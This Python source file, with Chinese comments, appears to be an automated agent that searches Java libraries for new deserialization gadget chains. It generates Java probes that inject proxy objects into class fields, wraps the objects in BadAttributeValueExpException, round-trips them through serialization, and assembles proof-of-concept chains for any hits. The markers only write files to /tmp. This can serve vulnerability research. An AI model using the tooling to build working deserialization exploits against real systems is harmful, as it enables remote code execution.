"""JGD JGDEvolvingAgent v2: 强制高频探测 + 发现即组链。

修复:
- Round 1 后强制每轮 ≥15 个探针(不是侦察)
- 候选严格排除已知链类(不是探测 TiedMapEntry/BeanComparator)
- FIELD_FORWARD 发现后立即生成链 PoC
- 结果显示修复(不再显示 ?)
"""
from __future__ import annotations

import json
import sqlite3
import subprocess
import sys
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from jgd import PROJECT_ROOT
from jgd.infra import chroma_store, llm, scope

HERE = PROJECT_ROOT

DYN = Path.home() / "cfx/dyn"
ECJ = Path.home() / "cfx/tools/ecj.jar"
IMPACT = Path.home() / "cfx/targets-impact/all-jars"
TOP50 = Path.home() / "cfx/targets-top50"
CLASSIC = Path.home() / "cfx/targets"
DB = Path.home() / "jgd/jgd_graph.db"
STATE = scope.scoped(HERE / "evolve_v2_state.json")

CP = f"{DYN}:{IMPACT}/*:{CLASSIC}/*:{TOP50}/*"

# R8: JDK17 模块封锁 — BAVE.val 反射写入需 opens java.management;
# ReflectionFactory 需 opens sun.reflect (jdk.unsupported 默认开, 显式声明防漂移)
JAVA_OPTS = ["--add-opens", "java.base/sun.reflect=ALL-UNNAMED",
             "--add-opens", "java.management/javax.management=ALL-UNNAMED"]

# 严格排除: 已知链的所有类 + JDK 内部类
EXCLUDE_PREFIXES = [
    "org.apache.commons.collections",
    "org.apache.commons.beanutils",
    "com.sun.syndication",
    "com.alibaba.fastjson",
    "com.mchange",
    "org.springframework.core.SerializableTypeWrapper",
    "sun.reflect.annotation",
    "java.", "javax.management.BadAttributeValueExpException",
    "java.security.SignedObject",
]

MARKER = """import java.io.*;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class MV{n} implements Serializable, InvocationHandler {{
    static void mark(String t) {{ try {{ java.nio.file.Files.write(
        java.nio.file.Paths.get("/tmp/jgdv2_{n}_" + t), "1".getBytes()); }}
        catch (Exception e) {{}} }}
    public String toString() {{ mark("field"); return "M"; }}
    public int hashCode() {{ mark("field"); return 1; }}
    public boolean equals(Object o) {{ mark("field"); return this == o; }}
    public String getProbe() {{ mark("getter"); return "M"; }}
    public Object invoke(Object proxy, Method m, Object[] a) {{
        mark(m.getName().equals("getProbe") ? "getter" : "field");
        Class<?> rt = m.getReturnType();
        if (rt == boolean.class) return Boolean.FALSE;
        if (rt == int.class) return Integer.valueOf(0);
        if (rt == long.class) return Long.valueOf(0L);
        if (rt == double.class) return Double.valueOf(0d);
        if (rt == float.class) return Float.valueOf(0f);
        if (rt == short.class) return Short.valueOf((short) 0);
        if (rt == byte.class) return Byte.valueOf((byte) 0);
        if (rt == char.class) return Character.valueOf('\\0');
        if (rt == String.class) return "M";
        return null;
    }}
}}
"""

PROBE = """import java.io.*;
import java.lang.reflect.*;

public class PV{n} {{
    static void mark(String t) {{ try {{ java.nio.file.Files.write(
        java.nio.file.Paths.get("/tmp/jgdv2_{n}_" + t),
        "1".getBytes()); }} catch (Exception e) {{}} }}

    public static void main(String[] args) {{
        try {{
            Class<?> c = Class.forName("{cls}");
            boolean ser = Serializable.class.isAssignableFrom(c);
            Object obj = null;
            try {{ obj = c.getDeclaredConstructor().newInstance(); }}
            catch (Throwable t) {{
                try {{
                    Constructor<?> ctor = sun.reflect.ReflectionFactory
                        .getReflectionFactory()
                        .newConstructorForSerialization(c,
                            Object.class.getDeclaredConstructor());
                    ctor.setAccessible(true); obj = ctor.newInstance();
                }} catch (Throwable t2) {{}}
            }}
            if (obj == null) {{
                // R7: 抽象类第三通道 — Unsafe 分配不走任何构造器,
                // 与 ObjectInputStream 的分配语义一致(抽象桥类也能测转发)
                try {{
                    Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
                    uf.setAccessible(true);
                    sun.misc.Unsafe U = (sun.misc.Unsafe) uf.get(null);
                    obj = U.allocateInstance(c);
                }} catch (Throwable t3) {{}}
            }}
            if (obj == null) {{ System.out.println("RESULT=INST_FAIL"); return; }}

            int inj = 0; int prox = 0;
            try {{
                for (Field f : c.getDeclaredFields()) {{
                    // R7修正: final 字段反序列化可写(OIS 反射赋值不走构造器),
                    // 正确排除集是 static+transient —— 旧探针排除 final, 恰好漏掉
                    // 最典型的攻击者可控字段(如 NamePrincipal.name)
                    if (Modifier.isStatic(f.getModifiers()) ||
                        Modifier.isTransient(f.getModifiers())) continue;
                    Class<?> ft = f.getType();
                    Object v;
                    if (ft == Object.class) {{
                        v = new MV{n}();
                    }} else if (ft.isInterface() ||
                               Modifier.isAbstract(ft.getModifiers())) {{
                        // R7: 接口/抽象字段用动态 Proxy 注入 —
                        // proxy instanceof <接口> 恒真, isInstance 检查通过,
                        // 后续调用分派到 handler.invoke (标记 fire)
                        try {{
                            v = Proxy.newProxyInstance(
                                ft.getClassLoader(), new Class[]{{ft}}, new MV{n}());
                            prox++;
                        }} catch (Throwable t) {{ continue; }}
                    }} else {{
                        continue;  // 具体类型: 标记对象过不了 isInstance
                    }}
                    try {{
                        f.setAccessible(true); f.set(obj, v); inj++;
                    }} catch (Throwable ignore) {{}}
                }}
            }} catch (Throwable ignore) {{}}

            // toString 触发测试(直接调用)
            try {{ obj.toString(); mark("tos_called"); }}
            catch (Throwable t) {{ mark("tos_ex"); }}

            if (ser) {{
                // BAVE 包装
                try {{
                    javax.management.BadAttributeValueExpException b =
                        new javax.management.BadAttributeValueExpException(null);
                    Field vf = b.getClass().getDeclaredField("val");
                    vf.setAccessible(true); vf.set(b, obj);
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    new ObjectOutputStream(bos).writeObject(b);
                    mark("ser_ok");
                    try {{
                        new ObjectInputStream(
                            new ByteArrayInputStream(bos.toByteArray())).readObject();
                        mark("deser_ok");
                    }} catch (Throwable t) {{ mark("deser_ex"); }}
                }} catch (Throwable t) {{ mark("ser_fail"); }}
            }}

            boolean ff = new File("/tmp/jgdv2_{n}_field").exists();
            boolean gf = new File("/tmp/jgdv2_{n}_getter").exists();
            boolean dok = new File("/tmp/jgdv2_{n}_deser_ok").exists();
            boolean sok = new File("/tmp/jgdv2_{n}_ser_ok").exists();
            String v = ff ? "FIELD_FORWARD" : gf ? "GETTER_FIRED"
                : dok ? "DESER_OK" : sok ? "SER_ONLY" : "FAIL";
            System.out.println("RESULT=" + v + " ser=" + ser + " inj=" + inj
                + " prox=" + prox + " field=" + ff + " getter=" + gf + " deser=" + dok);
        }} catch (Throwable t) {{
            System.out.println("RESULT=ERROR:" + t.getClass().getSimpleName());
        }}
    }}
}}
"""

CHAIN_POC = """import java.io.*;
import java.lang.reflect.*;

public class CV{n} {{
    static void mark(String t) {{ try {{ java.nio.file.Files.write(
        java.nio.file.Paths.get("/tmp/jgdv2_chain_{n}_" + t),
        "1".getBytes()); }} catch (Exception e) {{}} }}

    public static void main(String[] args) {{
        try {{
            // 组装链: BAVE → {cls}.toString() → 字段方法
            Class<?> bridgeClass = Class.forName("{cls}");
            Object bridge = null;
            try {{ bridge = bridgeClass.getDeclaredConstructor().newInstance(); }}
            catch (Throwable t1) {{
                try {{
                    Constructor<?> ctor = sun.reflect.ReflectionFactory
                        .getReflectionFactory()
                        .newConstructorForSerialization(bridgeClass,
                            Object.class.getDeclaredConstructor());
                    ctor.setAccessible(true); bridge = ctor.newInstance();
                }} catch (Throwable t2) {{}}
            }}
            if (bridge == null) {{
                try {{  // R7: 抽象类 Unsafe 通道
                    Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
                    uf.setAccessible(true);
                    bridge = ((sun.misc.Unsafe) uf.get(null))
                        .allocateInstance(bridgeClass);
                }} catch (Throwable t3) {{}}
            }}
            if (bridge == null) {{
                System.out.println("CHAIN_ERROR:INST_FAIL");
                return;
            }}

            // 注入恶意目标到 open 字段 (R7: final 可写; 接口走 Proxy 分派)
            for (Field f : bridgeClass.getDeclaredFields()) {{
                if (Modifier.isStatic(f.getModifiers()) ||
                    Modifier.isTransient(f.getModifiers())) continue;
                Class<?> ft = f.getType();
                Object v;
                if (ft == Object.class) {{
                    v = new MV{n}();
                }} else if (ft.isInterface() ||
                           Modifier.isAbstract(ft.getModifiers())) {{
                    try {{
                        v = Proxy.newProxyInstance(
                            ft.getClassLoader(), new Class[]{{ft}}, new MV{n}());
                    }} catch (Throwable t) {{ continue; }}
                }} else {{
                    continue;
                }}
                try {{
                    f.setAccessible(true); f.set(bridge, v);
                }} catch (Throwable ignore) {{}}
                break;
            }}

            // BAVE 包装
            javax.management.BadAttributeValueExpException b =
                new javax.management.BadAttributeValueExpException(null);
            Field vf = b.getClass().getDeclaredField("val");
            vf.setAccessible(true); vf.set(b, bridge);

            // 序列化 + 反序列化
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            new ObjectOutputStream(bos).writeObject(b);
            mark("serialized");

            try {{
                new ObjectInputStream(
                    new ByteArrayInputStream(bos.toByteArray())).readObject();
                mark("deser_complete");
            }} catch (Throwable t) {{
                mark("deser_ex_" + t.getClass().getSimpleName());
            }}

            boolean chain_fired = new File("/tmp/jgdv2_{n}_field").exists();
            System.out.println("CHAIN_RESULT=" +
                (chain_fired ? "CHAIN_TRIGGERED" : "CHAIN_NOT_TRIGGERED"));
            System.out.println("BRIDGE={cls}");
        }} catch (Throwable t) {{
            System.out.println("CHAIN_ERROR:" + t.getClass().getSimpleName()
                + ": " + t.getMessage());
        }}
    }}
}}
"""


def _jdk11_java() -> str:
    """R8: BAVE.val 在 JDK17 已收窄为 String, 载体注入只在 JDK≤11 可行;
    logback provider 实例化在 17 也被模块封锁。链 PoC 必须用 JDK 11 跑。"""
    for p in ("/usr/lib/jvm/java-11-openjdk-amd64/bin/java",
              "/usr/lib/jvm/java-11-openjdk/bin/java"):
        if Path(p).exists():
            return p
    return "java"


def sh(cmd, timeout=60):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=HERE)
    return p.returncode, p.stdout + p.stderr


def is_novel(cls: str) -> bool:
    return not any(cls.startswith(p) for p in EXCLUDE_PREFIXES)


class JGDEvolvingAgentV2:
    def __init__(self):
        self.db = chroma_store.VStore()
        self.state = self._load()
        self.probed = set(self.state.get("probed", []))
        self.discoveries = self.state.get("discoveries", [])
        self.knowledge = self.state.get("knowledge", [])
        self.candidate_pool = []

    def _load(self):
        if STATE.exists():
            return json.loads(STATE.read_text(encoding="utf-8"))
        return {"probed": [], "discoveries": [], "knowledge": [], "rounds": []}

    def _save(self):
        self.state["probed"] = list(self.probed)
        STATE.write_text(json.dumps(self.state, ensure_ascii=False, indent=1),
                         encoding="utf-8")

    def build_candidate_pool(self):
        """一次性构建全量候选池(不再每轮重复侦察)。"""
        print("[候选池] 构建...")
        pool = {}

        # 来源 1: 调用图(距 sink ≤3 跳 + 触发器)
        if DB.exists():
            conn = sqlite3.connect(str(DB))
            conn.row_factory = sqlite3.Row
            adj = {}
            for r in conn.execute("SELECT src_id, dst_id FROM edges LIMIT 500000"):
                adj.setdefault(r["src_id"], []).append(r["dst_id"])
            radj = {}
            for s, ds in adj.items():
                for d in ds:
                    radj.setdefault(d, []).append(s)
            sinks = {r["node_id"] for r in conn.execute(
                "SELECT node_id FROM nodes WHERE role='SINK' LIMIT 50")}
            reach = {}
            stack = [(n, 0) for n in sinks]
            while stack:
                nd, dist = stack.pop()
                if nd in reach or dist > 3:
                    continue
                reach[nd] = dist
                for p in radj.get(nd, []):
                    stack.append((p, dist + 1))

            triggers = {"toString", "hashCode", "equals", "compareTo", "compare"}
            for r in conn.execute(
                f"SELECT node_id, owner, signature FROM nodes "
                f"WHERE node_id IN ({','.join('?' * min(len(reach), 400))}) "
                f"AND kind='METHOD' LIMIT 1500",
                list(reach.keys())[:400]):
                mn = r["signature"].split("(")[0]
                if mn in triggers and is_novel(r["owner"]) and "$" not in r["owner"]:
                    pool[r["owner"]] = {"cls": r["owner"], "method": mn,
                                        "dist": reach.get(r["node_id"], -1),
                                        "source": "graph"}
            conn.close()

        # 来源 2: RAG (runtime_capability + bytecode_bridge + verify_agent_result)
        for q in ("serializable trigger toString bridge field forward",
                  "bytecode bridge getfield invokevirtual method",
                  "open injectable Object field sink"):
            for item in self.db.query(q, topk=20):
                if isinstance(item, tuple) and len(item) >= 2:
                    doc = item[1]
                    if isinstance(doc, dict):
                        # R7: verify_agent 的 payload 用 cls 键; 其他来源用 class
                        cls = (doc.get("payload", {}).get("class")
                               or doc.get("payload", {}).get("cls", ""))
                        if cls and is_novel(cls) and cls not in pool:
                            pool[cls] = {"cls": cls, "method": "unknown",
                                         "dist": -1, "source": doc.get("type", "rag")}

        # 来源 3: novel_paths.json
        np_file = scope.DATA / "novel_paths.json"
        if np_file.exists():
            for e in json.loads(np_file.read_text(encoding="utf-8")):
                cls = e.get("cls", "")
                if cls and is_novel(cls) and cls not in pool:
                    pool[cls] = {"cls": cls, "method": e.get("method", ""),
                                 "dist": e.get("dist_to_sink", -1),
                                 "source": "novel_paths"}

        # 来源 4: 直接扫描 JAR 找有 toString/hashCode 的可序列化类
        from jgd.mining import staticagent
        jar_count = 0
        for jar in sorted(IMPACT.glob("*.jar")):
            jar_count += 1
            if jar_count > 60:
                break
            try:
                with zipfile.ZipFile(jar) as z:
                    for ent in z.namelist():
                        if not ent.endswith(".class") or "-" in Path(ent).stem:
                            continue
                        cn = ent[:-6].replace("/", ".")
                        if not is_novel(cn) or "$" in cn or cn in pool:
                            continue
                        try:
                            ci = staticagent.parse_class(z.read(ent))
                        except Exception:
                            continue
                        if not ci:
                            continue
                        ser = ("java/io/Serializable" in ci["ifcs"] or
                               ci["super"] in staticagent.KNOWN_SERIAL_SUPERS)
                        has_trig = any(mn in triggers for (mn, _) in ci["methods"].keys())
                        if ser and has_trig:
                            pool[cn] = {"cls": cn, "method": "scan",
                                         "dist": -1, "source": "jar_scan"}
            except Exception:
                continue

        # 来源 5: verify_agent 对抗审计存活者 (R7: 验证结论必须喂回挖掘回路)
        # DISPUTED: ds否决但glm辩护成立 — 机制真实有争议, 最高优先深挖
        # DOWNGRADE/T3: 桥成立但价值待挖
        # REJECT: 审计知识进 RAG 作负样本过滤, 不进候选池
        verify_state = scope.DATA / "verify_state.json"
        if verify_state.exists():
            priority = {"DISPUTED": -9, "DOWNGRADE": -5}
            for a in json.loads(verify_state.read_text(encoding="utf-8")).get("audited", []):
                cls = a.get("cls", "")
                if not cls or not is_novel(cls):
                    continue
                p = priority.get(a.get("final_verdict", ""))
                if p is None:
                    continue
                nxt = (a.get("ds_audit") or {}).get("next_hop") or "none"
                # 覆盖而非跳过: 审计存活者携带对抗验证的优先级与桥证据,
                # 必须压过 RAG/graph 来源的同名低信息量条目
                pool[cls] = {"cls": cls,
                             "method": a.get("trigger", "toString"),
                             "dist": p, "source": f"verify:{a['final_verdict']}",
                             "bridge": f"{a.get('trigger')}->{a.get('field')}"
                                       f"({a.get('field_desc')})->{a.get('target')}",
                             "next_hop_hint": nxt}

        self.candidate_pool = [p for p in pool.values()
                               if p["cls"] not in self.probed]
        self.candidate_pool.sort(key=lambda x: x.get("dist", 99))
        print(f"  候选池: {len(self.candidate_pool)} (已排除 {len(self.probed)} 已测)")

    def probe_batch(self, count=15) -> list[dict]:
        """并行探测一批候选。"""
        batch = [c for c in self.candidate_pool if c["cls"] not in self.probed][:count]
        if not batch:
            return []

        results = []
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {}
            for i, cand in enumerate(batch):
                n = (int(time.time()) + i) % 100000
                fut = ex.submit(self._probe_one, cand, n)
                futures[fut] = cand

            for fut in as_completed(futures):
                r = fut.result()
                results.append(r)
                self.probed.add(r["cls"])

        self.candidate_pool = [c for c in self.candidate_pool
                               if c["cls"] not in self.probed]
        return results

    def _probe_one(self, cand, n):
        cls = cand["cls"]
        for t in ("field", "getter", "ser_ok", "deser_ok", "tos_called"):
            Path(f"/tmp/jgdv2_{n}_{t}").unlink(missing_ok=True)

        (DYN / f"PV{n}.java").write_text(PROBE.format(n=n, cls=cls), encoding="utf-8")
        (DYN / f"MV{n}.java").write_text(MARKER.format(n=n), encoding="utf-8")

        rc, out = sh(["java", "-jar", str(ECJ), "-11", "-nowarn",
                      "-cp", CP, "-d", str(DYN),
                      str(DYN / f"PV{n}.java"), str(DYN / f"MV{n}.java")])
        if rc != 0:
            return {"cls": cls, "verdict": "COMPILE_FAIL", "source": cand.get("source")}

        rc, out = sh(["java", *JAVA_OPTS, "-cp", CP, f"PV{n}"])
        verdict = "UNKNOWN"
        for line in out.splitlines():
            if line.startswith("RESULT="):
                verdict = line[7:]
                break
        return {"cls": cls, "verdict": verdict,
                "field_fired": Path(f"/tmp/jgdv2_{n}_field").exists(),
                "getter_fired": Path(f"/tmp/jgdv2_{n}_getter").exists(),
                "source": cand.get("source"), "method": cand.get("method"),
                "dist": cand.get("dist", -1)}

    def assemble_chain(self, discovery: dict) -> dict:
        """FIELD_FORWARD 发现后立即组装链 PoC。"""
        cls = discovery["cls"]
        n = int(time.time()) % 100000
        (DYN / f"CV{n}.java").write_text(
            CHAIN_POC.format(n=n, cls=cls), encoding="utf-8")
        (DYN / f"MV{n}.java").write_text(MARKER.format(n=n), encoding="utf-8")

        rc, out = sh(["java", "-jar", str(ECJ), "-11", "-nowarn",
                      "-cp", CP, "-d", str(DYN),
                      str(DYN / f"CV{n}.java"), str(DYN / f"MV{n}.java")])
        if rc != 0:
            return {"cls": cls, "chain_verdict": "CHAIN_COMPILE_FAIL"}

        # 清旧 field 标记(可能被探针污染)
        Path(f"/tmp/jgdv2_{n}_field").unlink(missing_ok=True)

        rc, out = sh([_jdk11_java(), *JAVA_OPTS, "-cp", CP, f"CV{n}"])
        chain_result = "UNKNOWN"
        for line in out.splitlines():
            if line.startswith("CHAIN_RESULT="):
                chain_result = line[13:]
                break
        return {"cls": cls, "chain_verdict": chain_result,
                "chain_output": out[-300:]}

    def run(self, max_rounds=4):
        print(f"{'=' * 60}")
        print(f"JGD JGDEvolvingAgent v2")
        print(f"  强制高频探测 + 发现即组链")
        print(f"{'=' * 60}")

        # Round 0: 一次性构建候选池
        self.build_candidate_pool()

        all_ff = []
        for rnd in range(1, max_rounds + 1):
            t0 = time.time()
            print(f"\n{'─' * 40}")
            print(f"Round {rnd} | 候选池: {len(self.candidate_pool)} | 已测: {len(self.probed)}")
            print(f"{'─' * 40}")

            # 强制探测 ≥15 个(不做侦察)
            count = min(15, len(self.candidate_pool))
            if count == 0:
                print("[!] 候选池耗尽")
                break

            results = self.probe_batch(count)
            ff = [r for r in results if r.get("field_fired")]
            gf = [r for r in results if r.get("getter_fired") and not r.get("field_fired")]
            dok = [r for r in results if "DESER_OK" in r.get("verdict", "")]

            print(f"  探针: {len(results)} | FIELD_FORWARD: {len(ff)} | "
                  f"GETTER: {len(gf)} | DESER_OK: {len(dok)}")

            for r in results:
                icon = "★" if r.get("field_fired") else ("◦" if r.get("getter_fired") else " ")
                print(f"  {icon} [{r['verdict']:<15}] {r['cls'].split('.')[-1]}")

            # 发现即组链
            for d in ff:
                print(f"\n  ★★ FIELD_FORWARD: {d['cls']} — 组装链 PoC...")
                chain = self.assemble_chain(d)
                d["chain"] = chain
                chain_v = chain.get("chain_verdict", "?")
                print(f"     链验证: {chain_v}")
                if "TRIGGERED" in chain_v:
                    print(f"     ★★★ {d['cls']} 是可用的新链桥! ★★★")
                all_ff.append(d)
                self.discoveries.append(d)

            # 持久化
            self.state["rounds"].append({
                "round": rnd, "probed": len(results),
                "ff": len(ff), "discoveries": len(self.discoveries)})
            self._save()

            # RAG 沉淀
            self.db.add([{"id": f"v2:r{rnd}:{r['cls']}",
                          "type": "v2_probe_result",
                          "tags": [r["verdict"].lower()],
                          "payload": r} for r in results])

            print(f"  耗时 {time.time() - t0:.0f}s")

        print(f"\n{'=' * 60}")
        print(f"JGDEvolvingAgent v2 完成")
        print(f"  已测: {len(self.probed)} 类")
        print(f"  FIELD_FORWARD 发现: {len(all_ff)}")
        print(f"  链触发: {sum(1 for d in all_ff if 'TRIGGERED' in d.get('chain', {}).get('chain_verdict', ''))}")
        for d in all_ff:
            cv = d.get("chain", {}).get("chain_verdict", "?")
            print(f"    ★ {d['cls']} → {cv}")
        print(f"  RAG: {self.db.count()}")
        print(f"{'=' * 60}")
        return len(all_ff)


    def retry_chains(self):
        """R8: 对 chain_verdict=UNKNOWN 的存量发现重跑链 PoC (修复后无需重探)."""
        retried = 0
        for d in self.discoveries:
            ch = d.get("chain") or {}
            if ch.get("chain_verdict") != "UNKNOWN":
                continue
            print(f"  retry chain: {d['cls'].split('.')[-1]}")
            d["chain"] = self.assemble_chain(d)
            retried += 1
        self._save()
        self.db.add([{"id": f"v2:chainretry:{d['cls']}",
                      "type": "v2_chain_retry",
                      "tags": [d.get("chain", {}).get("chain_verdict", "?").lower()],
                      "payload": {"cls": d["cls"],
                                  "chain_verdict": d.get("chain", {}).get("chain_verdict"),
                                  "chain_output": d.get("chain", {}).get("chain_output", "")}}
                     for d in self.discoveries])
        triggered = [d for d in self.discoveries
                     if "TRIGGERED" in (d.get("chain") or {}).get("chain_verdict", "")]
        print(f"  retried={retried} TRIGGERED={len(triggered)}")
        for d in triggered:
            print(f"    ★★★ {d['cls']}")
        return len(triggered)


if __name__ == "__main__":
    agent = JGDEvolvingAgentV2()
    if "--retry-chains" in sys.argv:
        raise SystemExit(agent.retry_chains())
    n = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 4
    raise SystemExit(agent.run(max_rounds=n))
